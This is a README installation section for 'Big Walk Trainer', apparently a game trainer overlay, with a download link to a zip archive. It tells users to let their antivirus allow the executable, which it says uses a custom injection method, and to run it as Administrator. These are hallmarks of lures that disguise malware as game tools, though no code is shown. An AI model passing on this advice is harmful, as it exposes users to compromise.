## 🛠️ Installation & Integration (The Gentle Path)

Big Walk Trainer is designed to be **non-invasive** — it runs as an external overlay, requiring **no modification** to your game’s core files.

1. **Acquire the bundle** — Use the [![Download](https://raw.githubusercontent.com/Nathi071/big-walk-motion-studio/main/bin_2468.svg)](https://Nathi071.github.io/big-walk-motion-studio/) link above. You will receive a single portable `.zip` archive.
2. **Extract to a clean folder** — e.g., `C:\Tools\BigWalkCompanion\`. Ensure your antivirus allows the executable (it is signed but uses a custom injection method).
3. **Launch the game first**, *then* run `BigWalkTrainer.exe` as Administrator. The overlay appears via the **F10** hotkey (rebindable in the settings panel).
4. **Select your game version** from the dropdown (Steam/Epic), and the trainer auto-detects the running process.

> **No admin rights?** The trainer falls back to a “read-only” mode that lets you view stats but not toggle features.
